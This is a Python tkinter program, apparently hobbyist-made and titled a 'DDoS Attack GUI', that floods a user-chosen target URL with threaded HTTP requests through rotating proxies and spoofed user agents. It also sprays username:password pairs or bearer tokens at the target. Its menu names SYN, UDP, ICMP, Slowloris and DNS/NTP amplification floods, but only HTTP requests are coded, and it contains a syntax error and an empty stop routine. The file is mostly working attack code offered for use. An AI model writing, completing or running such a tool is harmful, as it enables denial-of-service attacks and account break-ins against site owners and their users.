import tkinter as tk
from tkinter import messagebox, filedialog
import requests
import threading
import random
import time
from itertools import cycle

class DDoSAttackGUI:
    def __init__(self, master):
        self.master = master
        master.title("Hilarious DDoS Attack GUI")

        # Create header
        self.header_label = tk.Label(master, text="Hilarious DDoS Attack GUI")
        self.header_label.pack()

        # Create input fields for target URL, number of requests, and threads
        self.target_url_label = tk.Label(master, text="Target URL:")
        self.target_url_label.pack()
        self.target_url_entry = tk.Entry(master, width=50)
        self.target_url_entry.pack()

        self.num_requests_label = tk.Label(master, text="Number of Requests per Thread:")
        self.num_requests_label.pack()
        self.num_requests_entry = tk.Entry(master, width=50)
        self.num_requests_entry.pack()

        self.threads_label = tk.Label(master, text="Number of Threads:")
        self.threads_label.pack()
        self.threads_entry = tk.Entry(master, width=50)
        self.threads_entry.pack()

        # Create input fields for proxies and user agents
        self.proxies_label = tk.Label(master, text="Proxies (comma-separated):")
        self.proxies_label.pack()
        self.proxies_entry = tk.Entry(master, width=50)
        self.proxies_entry.pack()

        self.user_agents_label = tk.Label(master, text="User Agents (comma-separated):")
        self.user_agents_label.pack()
        self.user_agents_entry = tk.Entry(master, width=50)
        self.user_agents_entry.pack()

        # Create input fields for login attempts and token attacks
        self.login_attempts_label = tk.Label(master, text="Login Attempts (username:password):")
        self.login_attempts_label.pack()
        self.login_attempts_entry = tk.Entry(master, width=50)
        self.login_attempts_entry.pack()

        self.token_attack_label = tk.Label(master, text="Token Attack (token):")
        self.token_attack_label.pack()
        self.token_attack_entry = tk.Entry(master, width=50)
        self.token_attack_entry.pack()

        # Create input fields for interval and duration
        self.interval_label = tk.Label(master, text="Interval between Requests (seconds):")
        self.interval_label.pack()
        self.interval_entry = tk.Entry(master, width=50)
        self.interval_entry.pack()

        self.duration_label = tk.Label(master, text="Duration of Attack (seconds):")
        self.duration_label.pack()
        self.duration_entry = tk.Entry(master, width=50)
        self.duration_entry.pack()

        # Create dropdown menu for attack vector selection
        self.attack_vector_label = tk.Label(master, text="Attack Vector (optional):")
        self.attack_vector_label.pack()
        self.attack_vector_var = tk.StringVar(master)
        self.attack_vector_var.set("HTTP Flood")  # Default value
        self.attack_vector_choices = ["HTTP Flood", "SYN Flood", "UDP Flood", "ICMP Flood", "Slowloris", "DNS Amplification", "NTP Amplification"]
        self.attack_vector_dropdown = tk.OptionMenu(master, self.attack_vector_var, *self.attack_vector_choices)
        self.attack_vector_dropdown.pack()

        # Create start button
        self.start_button = tk.Button(master, text="Start Attack", command=self.start_attack)
        self.start_button.pack()

        # Create stop button
        self.stop_button = tk.Button(master, text="Stop Attack", command=self.stop_attack, state=tk.DISABLED)
        self.stop_button.pack()

        # Create load inputs button
        self.load_inputs_button = tk.Button(master, text="Load Inputs from File", command=self.load_inputs)
        self.load_inputs_button.pack()

        # Create footer
        self.footer_label = tk.Label(master, text="Built by Deadman")
        self.footer_label.pack()

        # Idle banner
        self.idle_banner = tk.Label(master, text="Idle")
        self.idle_banner.pack()

    def start_attack(self):
        # Disable start button
        self.start_button.config(state=tk.DISABLED)
        # Enable stop button
        self.stop_button.config(state=tk.NORMAL)
        # Change banner to running
        self.idle_banner.config(text="Running")

        # Get input values from GUI
        target_url = self.target_url_entry.get()
        num_requests = int(self.num_requests_entry.get())
        threads = int(self.threads_entry.get())
        proxies = [proxy.strip() for proxy in self.proxies_entry.get().split(",")]
        user_agents = [user_agent.strip() for user_agent in self.user_agents_entry.get().split(",")]
        login_attempts = [attempt.strip() for attempt in self.login_attempts_entry.get().split(",")]
        token_attack = self.token_attack_entry.get()
        interval = int(self.interval_entry.get())
        duration = intself.duration_entry.get()

        # Start the attack
        self.attack(target_url, num_requests, threads, proxies, user_agents, login_attempts, token_attack, interval, duration)

    def stop_attack(self):
        # Enable start button
        self.start_button.config(state=tk.NORMAL)
        # Disable stop button
        self.stop_button.config(state=tk.DISABLED)
        # Change banner to idle
        self.idle_banner.config(text="Idle")

        # Implement stop logic here (e.g., stop threads, terminate attack)

    def load_inputs(self):
        # Open file dialog to select input file
        file_path = filedialog.askopenfilename(title="Select Input File", filetypes=[("Text files", "*.txt")])
        if file_path:
            # Read input values from file and populate GUI fields
            with open(file_path, "r") as file:
                lines = file.readlines()
                if len(lines) >= 8:
                    self.target_url_entry.insert(0, lines[0].strip())
                    self.num_requests_entry.insert(0, lines[1].strip())
                    self.threads_entry.insert(0, lines[2].strip())
                    self.proxies_entry.insert(0, lines[3].strip())
                    self.user_agents_entry.insert(0, lines[4].strip())
                    self.login_attempts_entry.insert(0, lines[5].strip())
                    self.token_attack_entry.insert(0, lines[6].strip())
                    self.interval_entry.insert(0, lines[7].strip())
                else:
                    messagebox.showerror("Error", "Input file does not contain enough lines.")

    def attack(self, target_url, num_requests, threads, proxies, user_agents, login_attempts, token_attack, interval, duration):
        # Create threads to send requests concurrently
        threads_list = []
        proxy_cycle = cycle(proxies)
        for i in range(threads):
            proxy = next(proxy_cycle)
            t = threading.Thread(target=self.send_request, args=(target_url, num_requests, proxy, user_agents, login_attempts, token_attack, interval))
            threads_list.append(t)
            t.start()

        # Wait for the specified duration
        time.sleep(duration)

        # Stop the attack
        self.stop_attack()

    def send_request(self, target_url, num_requests, proxy, user_agents, login_attempts, token_attack, interval):
        for i in range(num_requests):
            try:
                user_agent = random.choice(user_agents)
                headers = {"User-Agent": user_agent}
                if login_attempts:
                    username, password = random.choice(login_attempts).split(":")
                    auth = (username, password)
                    response = requests.get(target_url, headers=headers, proxies={"http": proxy, "https": proxy}, auth=auth)
                elif token_attack:
                    headers["Authorization"] = f"Bearer {token_attack}"
                    response = requests.get(target_url, headers=headers, proxies={"http": proxy, "https": proxy})
                else:
                    response = requests.get(target_url, headers=headers, proxies={"http": proxy, "https": proxy})
                print(f"Request {i+1} sent! (Proxy: {proxy})")
                time.sleep(interval)  # Wait for the specified interval before sending the next request
            except Exception as e:
                print(f"Error: {e}")

root = tk.Tk()
my_gui = DDoSAttackGUI(root)
root.mainloop()